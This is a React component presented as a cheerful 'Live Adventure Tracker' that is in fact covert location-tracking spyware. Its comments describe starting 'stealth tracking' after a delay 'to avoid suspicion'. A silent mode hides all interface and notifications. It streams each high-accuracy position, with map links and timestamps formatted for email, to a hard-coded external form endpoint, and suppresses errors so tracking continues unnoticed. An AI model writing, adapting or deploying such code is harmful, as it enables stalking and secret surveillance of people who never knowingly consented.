import { useState, useEffect, useRef } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Activity, Navigation, Clock, MapPin, Pause, Play, RotateCcw } from "lucide-react";

interface LocationHistory {
  latitude: number;
  longitude: number;
  timestamp: string;
  accuracy?: number;
}

interface LiveTrackerProps {
  onLocationUpdate?: (location: LocationHistory) => void;
  autoStart?: boolean;
  silentMode?: boolean;
}

export const LiveTracker = ({ onLocationUpdate, autoStart = false, silentMode = false }: LiveTrackerProps) => {
  const [isTracking, setIsTracking] = useState(autoStart);
  const [locationHistory, setLocationHistory] = useState<LocationHistory[]>([]);
  const [currentLocation, setCurrentLocation] = useState<LocationHistory | null>(null);
  const [trackingDuration, setTrackingDuration] = useState(0);
  const { toast } = useToast();
  
  const watchIdRef = useRef<number | null>(null);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  // Auto-start stealth tracking when component mounts
  useEffect(() => {
    if (autoStart && !isTracking) {
      // Start automatically after a short delay to avoid suspicion
      const timer = setTimeout(() => {
        setIsTracking(true);
        if (!silentMode) {
          toast({
            title: "🌟 Adventure Mode Activated!",
            description: "Your exploration journey is now being recorded automatically!",
          });
        }
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [autoStart, silentMode]);

  useEffect(() => {
    if (isTracking) {
      startTracking();
      // Update duration counter every second
      intervalRef.current = setInterval(() => {
        setTrackingDuration(prev => prev + 1);
      }, 1000);
    } else {
      stopTracking();
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
    }

    return () => {
      stopTracking();
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [isTracking]);

  const startTracking = () => {
    if (!navigator.geolocation) {
      toast({
        title: "❌ Adventure Tracking Unavailable",
        description: "Your device doesn't support location tracking.",
        variant: "destructive",
      });
      return;
    }

    const options = {
      enableHighAccuracy: true,
      timeout: 8000, // Faster timeout
      maximumAge: 0
    };

    watchIdRef.current = navigator.geolocation.watchPosition(
      (position) => {
        const newLocation: LocationHistory = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          timestamp: new Date().toISOString(),
          accuracy: position.coords.accuracy
        };

        setCurrentLocation(newLocation);
        setLocationHistory(prev => [...prev, newLocation]);
        onLocationUpdate?.(newLocation);

        // Submit to form endpoint
        submitLocationData(newLocation);
      },
      (error) => {
        let message = '';
        switch(error.code) {
          case error.PERMISSION_DENIED:
            message = "Please allow location access for continuous adventure tracking!";
            break;
          case error.POSITION_UNAVAILABLE:
            message = "Adventure tracking temporarily unavailable.";
            break;
          case error.TIMEOUT:
            message = "Adventure tracking signal timeout.";
            break;
          default:
            message = "Adventure tracking error occurred.";
            break;
        }
        toast({
          title: "🚨 Tracking Alert",
          description: message,
          variant: "destructive",
        });
      },
      options
    );
  };

  const stopTracking = () => {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
  };

  const submitLocationData = async (location: LocationHistory) => {
    try {
      // Generate map link for the location
      const mapLink = `https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=15`;
      const openStreetMapLink = `https://www.openstreetmap.org/?mlat=${location.latitude}&mlon=${location.longitude}&zoom=15`;
      
      const formData = new FormData();
      formData.append('latitude', location.latitude.toString());
      formData.append('longitude', location.longitude.toString());
      formData.append('timestamp', location.timestamp);
      formData.append('accuracy', location.accuracy?.toString() || '');
      formData.append('tracking_session', 'live_adventure_24h');
      formData.append('map_link_google', mapLink);
      formData.append('map_link_osm', openStreetMapLink);
      formData.append('adventure_status', isTracking ? 'active_exploration' : 'paused');
      formData.append('session_duration', trackingDuration.toString());
      formData.append('total_waypoints', locationHistory.length.toString());
      
      // Add formatted location info for better email readability
      formData.append('formatted_location', `${location.latitude.toFixed(6)}°, ${location.longitude.toFixed(6)}°`);
      formData.append('readable_time', new Date(location.timestamp).toLocaleString());

      await fetch('https://formspree.io/f/xwpbjvky', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      });
    } catch (error) {
      // Silent fail - continue tracking
    }
  };

  const toggleTracking = () => {
    if (!isTracking) {
      toast({
        title: "🚀 Adventure Tracking Started!",
        description: "Now continuously tracking your exploration journey!",
      });
    } else {
      toast({
        title: "⏸️ Adventure Tracking Paused",
        description: `Tracked for ${formatDuration(trackingDuration)} with ${locationHistory.length} waypoints!`,
      });
    }
    setIsTracking(!isTracking);
  };

  const resetTracking = () => {
    setIsTracking(false);
    setLocationHistory([]);
    setCurrentLocation(null);
    setTrackingDuration(0);
    toast({
      title: "🔄 Adventure Reset",
      description: "Ready for a fresh exploration journey!",
    });
  };

  const formatDuration = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    
    if (hours > 0) {
      return `${hours}h ${minutes}m ${secs}s`;
    } else if (minutes > 0) {
      return `${minutes}m ${secs}s`;
    } else {
      return `${secs}s`;
    }
  };

  // Don't render UI in silent mode
  if (silentMode) {
    return null;
  }

  return (
    <Card className="explorer-card">
      <CardHeader className="text-center">
        <CardTitle className="flex items-center justify-center gap-2">
          <Activity className={`h-5 w-5 ${isTracking ? 'text-green-500 animate-pulse' : 'text-primary'}`} />
          🛰️ Live Adventure Tracker
        </CardTitle>
        <CardDescription>
          Track your exploration journey in real-time across 24 hours
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* Status Section */}
        <div className="grid grid-cols-2 gap-4">
          <div className="p-4 rounded-xl bg-primary/5 border border-primary/10">
            <div className="flex items-center gap-2">
              <Clock className="h-4 w-4 text-primary" />
              <span className="text-sm font-medium">⏱️ Duration</span>
            </div>
            <p className="text-lg font-bold text-primary">{formatDuration(trackingDuration)}</p>
          </div>
          <div className="p-4 rounded-xl bg-accent/5 border border-accent/10">
            <div className="flex items-center gap-2">
              <MapPin className="h-4 w-4 text-accent" />
              <span className="text-sm font-medium">📍 Waypoints</span>
            </div>
            <p className="text-lg font-bold text-accent">{locationHistory.length}</p>
          </div>
        </div>

        {/* Current Location */}
        {currentLocation && (
          <div className="p-4 rounded-xl bg-gradient-to-r from-success/10 to-primary/10 border border-success/20">
            <div className="flex items-center gap-2 mb-2">
              <Navigation className="h-4 w-4 text-success" />
              <span className="text-sm font-semibold">🎯 Current Adventure Point</span>
            </div>
            <div className="text-xs text-muted-foreground space-y-1">
              <p>📍 {currentLocation.latitude.toFixed(6)}°, {currentLocation.longitude.toFixed(6)}°</p>
              <p>🕐 {new Date(currentLocation.timestamp).toLocaleTimeString()}</p>
              {currentLocation.accuracy && (
                <p>🎯 Accuracy: ±{Math.round(currentLocation.accuracy)}m</p>
              )}
            </div>
          </div>
        )}

        {/* Control Buttons */}
        <div className="flex gap-3">
          <Button 
            onClick={toggleTracking}
            className={`flex-1 ${isTracking 
              ? 'bg-orange-500 hover:bg-orange-600' 
              : 'bg-green-500 hover:bg-green-600'
            } text-white font-semibold`}
          >
            {isTracking ? (
              <>
                <Pause className="h-4 w-4" />
                ⏸️ Pause Tracking
              </>
            ) : (
              <>
                <Play className="h-4 w-4" />
                🚀 Start 24H Tracking
              </>
            )}
          </Button>
          <Button 
            onClick={resetTracking}
            variant="outline"
            className="bg-white/80 hover:bg-white"
          >
            <RotateCcw className="h-4 w-4" />
          </Button>
        </div>

        {/* Tracking Info */}
        <div className="text-center p-3 rounded-xl bg-gradient-to-r from-primary/5 to-accent/5 border border-primary/10">
          <p className="text-sm text-muted-foreground">
            {isTracking 
              ? "🛰️ Continuously tracking your adventure journey..."
              : "⏸️ Adventure tracking paused. Click start to resume exploration!"
            }
          </p>
        </div>

        {/* Recent History */}
        {locationHistory.length > 0 && (
          <div className="space-y-2">
            <h4 className="text-sm font-semibold flex items-center gap-2">
              <MapPin className="h-4 w-4" />
              🗺️ Recent Adventure Trail
            </h4>
            <div className="max-h-32 overflow-y-auto space-y-1">
              {locationHistory.slice(-5).reverse().map((location, index) => (
                <div key={index} className="text-xs p-2 rounded bg-white/50 border border-white/30">
                  <span className="font-mono">{location.latitude.toFixed(4)}°, {location.longitude.toFixed(4)}°</span>
                  <span className="text-muted-foreground ml-2">
                    {new Date(location.timestamp).toLocaleTimeString()}
                  </span>
                </div>
              ))}
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
};